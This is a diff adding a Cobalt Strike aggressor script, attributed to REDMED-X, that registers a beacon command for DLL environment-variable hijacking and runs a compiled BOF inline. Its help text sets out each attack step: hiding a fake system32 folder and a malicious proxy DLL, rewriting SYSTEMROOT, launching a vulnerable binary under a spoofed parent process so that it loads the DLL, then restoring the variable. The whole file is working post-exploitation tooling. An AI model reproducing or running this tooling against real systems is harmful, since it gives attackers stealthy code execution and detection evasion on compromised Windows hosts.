@@ -1,0 +1,35 @@
+# author REDMED-X
+
+beacon_command_register(
+	"dllenvhijacking", "BOF implementation of DLL environment hijacking.\n",
+	"INFO:\nThis tool will setup a hidden file structure, move an already on disk present malicious proxy DLL to the new system32 folder, hide the proxy DLL, modify the SYSTEMROOT environment variable, run the vulnerable binary as a spoofed process to execute the malicious DLL, and reset the original SYSTEMROOT environment variable so the beacon keeps working as intended.\n\nOPTIONS:\n[<new sysroot dir>]: the new directory name as a path that will be used as the new SYSTEMROOT variable like C:\\Data\\ (make sure the directory path ends with \\).\n[<malicious DLL name>]: the name of the malicious DLL that will be loaded by the vulnerable binary (e.g. mswsock.dll).\n[<path to mal. DLL folder>]: the path on the target system to the folder were the malicious DLL is stored (don't add the DLL name and end the path with a \\).\n[<name of vulnerable binary>]: the name of the vulnerable binary that will be executed and loads the malicious DLL (e.g. hostname.exe).\n[<pid parent proc>]: the process ID of the parent process under which the vulnerable binary will run as a child.\n\n" .
+	"USAGE:\ndllenvhijacking <new sysroot dir> <malicious DLL name> <path to mal. DLL folder> <name of vulnerable binary> <pid parent proc>\n\n");
+
+
+alias dllenvhijacking {
+    $bid = $1;
+    $sysroot = $2;
+	$proxydll = $3;
+	$pathtodll = $4;
+	$vulnbinary = $5;
+	$pid = $6;
+
+	if ($sysroot eq "" || $proxydll eq "" || $pathtodll eq "" || $vulnbinary eq "" || $pid eq "") {
+		berror($bid, "Please make sure that all the arguments are filled in and correct!\n");
+		return;
+	}
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("dllenvhijacking.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data  = bof_pack($bid, "ZZZzi", $sysroot, $proxydll, $pathtodll, $vulnbinary, $pid);
+	
+
+	blog($bid, "Tasked execute DLL Environment hijacking..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
